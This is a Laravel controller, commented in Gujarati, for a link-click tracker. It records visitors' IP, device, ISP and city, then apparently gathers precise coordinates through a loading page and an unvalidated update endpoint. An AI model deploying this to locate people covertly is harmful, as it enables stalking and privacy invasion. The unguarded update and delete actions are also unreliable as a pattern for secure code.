<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Stevebauman\Location\Facades\Location;

class TrackController extends Controller
{
    public function track(Request $request)
    {
        // સાચો Public IP મેળવો
        $ip = $request->ip();

        // IP બેઝ લોકેશન
        $locationData = Location::get($ip);

        // ISP મેળવવા માટે API (Jio, Airtel વગેરે જાણવા માટે)
        $ispName = 'Unknown';
        try {
            $response = Http::timeout(3)->get("http://ip-api.com/json/{$ip}?fields=isp");
            $ispName = $response->json('isp', 'Unknown');
        } catch (\Exception $e) { $ispName = 'Unknown'; }

        // ડેટાબેઝમાં એન્ટ્રી અને ID મેળવવી
        $id = DB::table('clicks')->insertGetId([
            'ip'         => $ip,
            'device'     => $request->header('User-Agent'),
            'isp'        => $ispName,
            'city'       => $locationData->cityName ?? 'Unknown',
            'country'    => $locationData->countryName ?? 'Unknown',
            'latitude'   => $locationData->latitude ?? null,
            'longitude'  => $locationData->longitude ?? null,
            'clicked_at' => now(),
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        return view('loading', ['id' => $id]);
    }

    public function updateLocation(Request $request)
    {
        DB::table('clicks')->where('id', $request->id)->update([
            'latitude'   => $request->latitude,
            'longitude'  => $request->longitude,
            'updated_at' => now(),
        ]);
        return response()->json(['status' => 'success']);
    }

    public function dashboard()
    {
        $data = DB::table('clicks')->orderBy('clicked_at', 'desc')->get();
        return view('dashboard', compact('data'));
    }

    public function destroyAll()
    {
        DB::table('clicks')->truncate();
        return back();
    }
}
